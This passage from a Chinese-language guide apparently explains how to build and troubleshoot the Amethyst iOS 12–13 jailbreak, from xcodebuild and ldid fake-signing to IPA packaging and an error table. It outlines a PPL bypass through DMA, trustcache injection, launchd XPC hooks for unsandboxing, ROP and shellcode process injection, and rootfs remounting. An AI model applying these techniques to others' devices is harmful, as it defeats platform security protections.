    CODE_SIGNING_REQUIRED=NO \
    -sdk iphoneos \
    -configuration Release \
    -project Amethyst.xcodeproj \
    -scheme Amethyst

# 产物在: build/Release-iphoneos/Amethyst.app/
```

### 7.4 完整 IPA 打包

```bash
cd /workspace/Amethyst

# strip + ldid 签名主二进制
strip build/Release-iphoneos/Amethyst.app/Amethyst
ldid -S build/Release-iphoneos/Amethyst.app/Amethyst

# 打包 IPA
mkdir build/Release-iphoneos/Payload
mv build/Release-iphoneos/Amethyst.app build/Release-iphoneos/Payload
ditto -c -k --sequesterRsrc --keepParent build/Release-iphoneos/Payload Amethyst.ipa

# 通过 TrollStore 或签名安装
```

### 7.5 验证 basebins.tar 已嵌入

```bash
# 解压 IPA 检查
unzip Amethyst.ipa -d Amethyst_extracted
ls Amethyst_extracted/Payload/Amethyst.app/basebins.tar
# 应存在且非空
```

---

## 8. 常见编译错误与解决方案

### 8.1 basebins 编译错误

#### 错误 1: `clang: error: unknown target triple 'arm64e-apple-ios12.0`

**原因**：Xcode 版本过低或非 Apple Silicon Mac。

**解决**：
```bash
# 升级 Xcode 至 14+
softwareupdate --list
# 或从 https://developer.apple.com/download/all/ 下载 Xcode 14.2
```

#### 错误 2: `ldid: command not found`

**原因**：ldid 未安装或未在 PATH。

**解决**：
```bash
brew install ldid
echo 'export PATH="/opt/homebrew/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc
```

#### 错误 3: `llvm-objcopy: command not found`

**原因**：jbutil Makefile 用 llvm-objcopy 提取 shellcode。

**解决**：
```bash
brew install llvm
echo 'export PATH="/opt/homebrew/opt/llvm/bin:$PATH"' >> ~/.zshrc
source ~/.zshrc

# 验证
which llvm-objcopy
```

#### 错误 4: `xcrun: error: unable to find utility "clang"`

**原因**：未安装 Command Line Tools 或 Xcode 路径未设置。

**解决**：
```bash
sudo xcode-select --switch /Applications/Xcode.app/Contents/Developer
xcode-select --install
```

#### 错误 5: `basebins.tar: No such file or directory` (Xcode 编译 Amethyst 时)

**原因**：未先编译 basebins，Xcode 找不到 basebins.tar 资源。

**解决**：
```bash
cd /workspace/basebins
make package
# 然后再编译 Amethyst
```

#### 错误 6: `framework IOSurface not found`

**原因**：SDK 路径错误或 IOSurface.framework 移除。

**解决**：
```bash
# 验证 SDK 中有 IOSurface
ls $(xcrun --sdk iphoneos --show-sdk-path)/System/Library/Frameworks/IOSurface.framework
# 若无，需重新安装 Xcode
```

### 8.2 运行时错误

#### 错误: `Jailbreak Failed - Failed to handoff the jailbreak server to launchd`

按第 6 节根因分析逐项排查。

#### 错误: `Jailbreak Failed - Exploit failed`

**原因**：漏洞未成功触发。

**解决**：
- A12/A13: 重启设备后重试（Hemlock 不是 100% 稳定）
- A7-A11: 删除 `~/Documents/trigon.plist` 缓存重试
- 检查 iOS 版本是否在支持范围内（12.0-13.x）

#### 错误: `Jailbreak Failed - Failed to remount rootfs`

**原因**：APFS snapshot revert 失败。

**解决**：
- 检查 OTA 是否已卸载（设置 → 通用 → iPhone 存储）
- 通过 `mount` 检查 `/System/Versions/Update` 是否还存在
- 必要时用 iTunes 重装系统

---

## 9. 关键技术细节

### 9.1 ARM64 vs ARM64e 的差异

| 特性 | arm64 | arm64e |
|------|-------|--------|
| **PAC** (Pointer Authentication) | 不支持 | 支持 |
| **指针签名** | 无 | `ptrauth_sign` / `ptrauth_auth` |
| **launchd 架构** (A12+) | - | arm64e |
| **dlopen 加载** | 仅可加载 arm64 dylib | 仅可加载 arm64e dylib |
| **thread_set_state** | 直接设置 PC/SP/LR | 需 `__DARWIN_ARM_THREAD_STATE64_FLAGS_NO_PTRAUTH` 或签名指针 |

### 9.2 PPL Bypass（A12+）

PPL（Page Protection Layer）是 A12 引入的硬件级保护，防止内核任意修改页表。Amethyst 通过 DMA 原语绕过：

```c
// jailbreak.c:321
if (kinfo->protections.ppl) {
    if (dma_init() != 0) { ... }   // 建立 DMA 读写通道
    if (ppl_init() != 0) { ... }    // 通过 DMA 修改 PPL 保护的页
}
```

具体原理见 [dma.c](file:///workspace/Amethyst/Amethyst/jailbreak/dma.c) 与 [ppl.c](file:///workspace/Amethyst/Amethyst/jailbreak/ppl.c)。

### 9.3 TrustCache 类型

| 版本 | 静态 TrustCache | 动态 TrustCache |
|------|-----------------|------------------|
| iOS 12.0+ | `STATIC_TC_TYPE_SEGEXTRADATA` (内核 __DATA 段) | `DYNAMIC_TC_TYPE_V0` (20字节 hash) |
| iOS 13+ | `STATIC_TC_TYPE_SEGEXTRADATA` | `DYNAMIC_TC_TYPE_V1` (20字节 hash + 1字节 type + 1字节 flags) |

```c
// trustcache.c:265
bool trustcache_check(uint8_t *cd_hash) {
    return trustcache_dynamic_check(cd_hash);
}
```

### 9.4 jbserver XPC 协议

**iOS 12**：hook `_xpc_serializer_unpack`（XPC 反序列化函数）
**iOS 13+**：hook `xpc_receive_mach_msg`（XPC 消息接收函数）

```c
// launchd_hook/src/jbserver.c:538
if (kinfo->version[0] <= 12) {
    void *symbol = dlsym(handle, "_xpc_serializer_unpack");
    hook_function(symbol, (void *)xpc_serializer_unpack_hook, ...);
} else {
    void *symbol = dlsym(handle, "xpc_receive_mach_msg");
    hook_function(symbol, (void *)xpc_receive_mach_msg_hook, ...);
}
```

jbserver 命令列表（来自 [jbserver.h](file:///workspace/basebins/launchd_hook/include/jbserver.h#L29-L42)）：

```c
JBSERVER_CMD_TRUSTCACHE        // 添加 cd_hash 到动态 trustcache
JBSERVER_CMD_SIGN_BINARY       // 给二进制加伪签名
JBSERVER_CMD_PRELOAD_BINARY    // 预加载二进制（patch cs_blob）
JBSERVER_CMD_INIT_PROCESS      // 初始化进程（提权、去沙箱）
JBSERVER_CMD_PLATFORMIZE       // 设置 platform binary 标志
JBSERVER_CMD_UNSANDBOX         // 去沙箱
JBSERVER_CMD_PATCH_SETUID      // 修复 setuid 行为
JBSERVER_CMD_PATCH_SETGID      // 修复 setgid 行为
JBSERVER_CMD_CHECK_FAKESIGNED  // 检查是否伪签名
JBSERVER_CMD_ADD_FAKESIGNED    // 添加伪签名记录
JBSERVER_CMD_HEARTBEAT         // 心跳检查（返回 0x1337）
```

### 9.5 进程注入的两条路径

来自 [injector.c](file:///workspace/basebins/jbutil/src/injector.c)：

**1. ROP 注入**（默认，A12+ 也支持）：
```
1. 在目标进程 alloc stack + string
2. 创建线程，PC = pthread_set_self
3. 等待线程到达 spin_gadget（spin loop）
4. 切换 PC = dlopen(path, RTLD_NOW)
5. 等待 dlopen 返回 spin_gadget
```

**2. Shellcode 注入**（仅 arm64，A11 及以下）：
```
1. 在目标进程 alloc code + stack
2. 把预编译的 shellcode 写入 code 区域
3. 在 shellcode 中填入 pthread_create / dlopen 地址
4. 创建线程，PC = code 区域起始地址
5. shellcode 自己调用 pthread_create + dlopen
```

### 9.6 launchd_hook.dylib 关键 Hook

```c
// launchd_hook/src/jbserver.c
1. _xpc_serializer_unpack (iOS 12) / xpc_receive_mach_msg (iOS 13+)
   → 拦截 jbserver XPC 请求
2. xpc_dictionary_get_value
   → 注入 /Library/LaunchDaemons 下的自定义 plist
   → 修改 MobileInternetSharing 的 KeepAlive
3. sandbox_check_by_audit_token
   → 允许 cy:/lh:/substituted 等 mach lookup
```

### 9.7 RootFS Remount 流程

来自 [remount.c](file:///workspace/Amethyst/Amethyst/jailbreak/remount.c)：

```
1. 检查 OTA 是否挂载（如有则报错 JB_ERROR_OTA）
2. APFS snapshot revert（revert 到 rootfs snapshot）
3. 修改 mount flag，去掉 MNT_RDONLY / MNT_NOSUID
4. 重新挂载 / 为 RW
5. 创建 /var/jb 用于 Procursus 内容
```

---

## 10. 参考资料

### 10.1 项目内部文档

- [README.md](file:///workspace/README.md) - 项目说明
- [Amethyst/buildipa.sh](file:///workspace/Amethyst/buildipa.sh) - IPA 构建脚本
- [basebins/Makefile](file:///workspace/basebins/Makefile) - basebins 顶层 Makefile
- [Amethyst/Amethyst.xcodeproj/project.pbxproj](file:///workspace/Amethyst/Amethyst.xcodeproj/project.pbxproj) - Xcode 工程配置

### 10.2 关键源码文件

#### 漏洞利用
- [Amethyst/Amethyst/exploit/hemlock/hemlock.c](file:///workspace/Amethyst/Amethyst/exploit/hemlock/hemlock.c) - Hemlock 漏洞（A12/A13）
- [Amethyst/Amethyst/exploit/trigon/trigon.c](file:///workspace/Amethyst/Amethyst/exploit/trigon/trigon.c) - Trigon 漏洞（A7-A11）
- [Amethyst/Amethyst/exploit/trigon/aop.c](file:///workspace/Amethyst/Amethyst/exploit/trigon/aop.c) - AOP 协处理器利用

#### Jailbreak 主流程
- [Amethyst/Amethyst/jailbreak/jailbreak.c](file:///workspace/Amethyst/Amethyst/jailbreak/jailbreak.c) - 主流程编排
- [Amethyst/Amethyst/jailbreak/handoff.c](file:///workspace/Amethyst/Amethyst/jailbreak/handoff.c) - ★ launchd handoff
- [Amethyst/Amethyst/jailbreak/trustcache.c](file:///workspace/Amethyst/Amethyst/jailbreak/trustcache.c) - TrustCache 操作
- [Amethyst/Amethyst/jailbreak/ppl.c](file:///workspace/Amethyst/Amethyst/jailbreak/ppl.c) - PPL bypass
- [Amethyst/Amethyst/jailbreak/dma.c](file:///workspace/Amethyst/Amethyst/jailbreak/dma.c) - DMA 原语
- [Amethyst/Amethyst/jailbreak/remount.c](file:///workspace/Amethyst/Amethyst/jailbreak/remount.c) - RootFS remount
- [Amethyst/Amethyst/jailbreak/dyld.c](file:///workspace/Amethyst/Amethyst/jailbreak/dyld.c) - dyld patch

#### basebins
- [basebins/jbutil/src/main.c](file:///workspace/basebins/jbutil/src/main.c) - jbutil 主程序
- [basebins/jbutil/src/injector.c](file:///workspace/basebins/jbutil/src/injector.c) - ★ 进程注入
- [basebins/jbutil/src/process.c](file:///workspace/basebins/jbutil/src/process.c) - 进程操作
- [basebins/launchd_hook/src/main.c](file:///workspace/basebins/launchd_hook/src/main.c) - launchd hook 入口
- [basebins/launchd_hook/src/jbserver.c](file:///workspace/basebins/launchd_hook/src/jbserver.c) - ★ jbserver XPC 实现
- [basebins/base_hook/src/main.c](file:///workspace/basebins/base_hook/src/main.c) - 通用 hook
- [basebins/libjailbreak/src/main.c](file:///workspace/basebins/libjailbreak/src/main.c) - 客户端库

### 10.3 外部参考

- **Operation Triangulation**: Trigon 漏洞来源 - https://www.kaspersky.com/blog/trng-2023/
- **puaf_physpuppet**: Hemlock 使用的原语 - https://github.com/felix-pb/puaf
- **Procursus Bootstrap**: 捆绑的包管理器 bootstrap - https://github.com/ProcursusTeam/Procursus
- **iOS Code Signing**: AMFI / fsignatures / trustcache 工作原理
- **PAC / PPL**: A12+ 硬件保护机制 - Apple Platform Security Guide
- **Xcode Download**: https://developer.apple.com/xcode/
- **ldid**: https://github.com/ProcursusTeam/ldid

### 10.4 编译环境一键检查脚本

将以下脚本保存为 `check_env.sh` 运行：

```bash
#!/bin/bash
echo "=== Amethyst 编译环境检查 ==="
echo ""

echo "[1] CPU 架构 (必须 arm64):"
uname -m
echo ""

echo "[2] Xcode 版本 (>= 14.0):"
xcodebuild -version 2>/dev/null || echo "✗ Xcode 未安装"
echo ""

echo "[3] iPhoneOS SDK 版本:"
xcrun --sdk iphoneos --show-sdk-version 2>/dev/null || echo "✗ SDK 未找到"
echo ""

echo "[4] Command Line Tools:"
xcode-select -p
echo ""

echo "[5] clang (支持 arm64e):"
xcrun --sdk iphoneos --find clang
echo "  测试编译 arm64e..."
echo 'int main(){return 0;}' > /tmp/test_arm64e.c
xcrun --sdk iphoneos clang -arch arm64e -mios-version-min=12.0 -isysroot \
    $(xcrun --sdk iphoneos --show-sdk-path) -c /tmp/test_arm64e.c -o /tmp/test_arm64e.o 2>&1 \
    && echo "  ✓ arm64e 编译成功" || echo "  ✗ arm64e 编译失败"
rm -f /tmp/test_arm64e.c /tmp/test_arm64e.o
echo ""

echo "[6] ldid (代码签名):"
which ldid && ldid -V 2>&1 | head -1 || echo "  ✗ 未安装 (brew install ldid)"
echo ""

echo "[7] llvm-objcopy (shellcode 提取):"
which llvm-objcopy || echo "  ✗ 未安装 (brew install llvm)"
echo ""

echo "[8] dpkg-deb (.deb 打包):"
which dpkg-deb || echo "  ✗ 未安装 (brew install dpkg)"
echo ""

echo "=== 检查完成 ==="
```

---

## 附录 A：完整编译命令速查

```bash
# 一键编译 + 打包 IPA
cd /workspace
bash Amethyst/buildipa.sh

# 或分步执行
cd /workspace/basebins
make clean && make all && make package

cd /workspace/Amethyst
xcodebuild clean build \
    CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO \
    -sdk iphoneos -configuration Release \
    -project Amethyst.xcodeproj -scheme Amethyst

strip build/Release-iphoneos/Amethyst.app/Amethyst
ldid -S build/Release-iphoneos/Amethyst.app/Amethyst
mkdir -p build/Release-iphoneos/Payload
mv build/Release-iphoneos/Amethyst.app build/Release-iphoneos/Payload/
ditto -c -k --sequesterRsrc --keepParent \
    build/Release-iphoneos/Payload Amethyst.ipa
```

## 附录 B：错误对照表

| 错误信息 | 错误码 | 根因 | 修复方向 |
|----------|--------|------|----------|
| `Jailbreak Failed` | `JB_ERROR_EXPLOIT` | 漏洞触发失败 | 重启设备 / 清 trigon 缓存 |
| `Jailbreak Failed` | `JB_ERROR_PERMISSION` | 提权失败 | 检查 tfp0 有效性 |
| `Jailbreak Failed` | `JB_ERROR_PATCHFINDER` | 内核符号查找失败 | 检查 iOS 版本 offsets |
| `Jailbreak Failed` | `JB_ERROR_TRUSTCACHE` | TrustCache 初始化失败 | 检查内核偏移 |
| `Jailbreak Failed` | `JB_ERROR_PPL` | PPL bypass 失败 | A12+ 检查 DMA 原语 |
| `Jailbreak Failed` | `JB_ERROR_REMOUNT` | RootFS remount 失败 | 卸载 OTA / 重装系统 |
| **`Jailbreak Failed`** | **`JB_ERROR_HANDOFF`** | **launchd 注入失败** | **见第 6 节详述** |
| `Jailbreak Failed` | `JB_ERROR_DYLD` | dyld patch 失败 | 检查 /usr/lib/dyld |
| `Jailbreak Failed` | `JB_ERROR_BOOTSTRAP` | Bootstrap 安装失败 | 检查 bootstrap tar |
| `Jailbreak Failed` | `JB_ERROR_OTA` | OTA 仍挂载 | 卸载 OTA 更新 |

---

**文档版本**: v1.0  
**最后更新**: 2026-07-27  
**项目版本**: Amethyst 1.0.3  
**适用 iOS**: 12.0 – 13.x
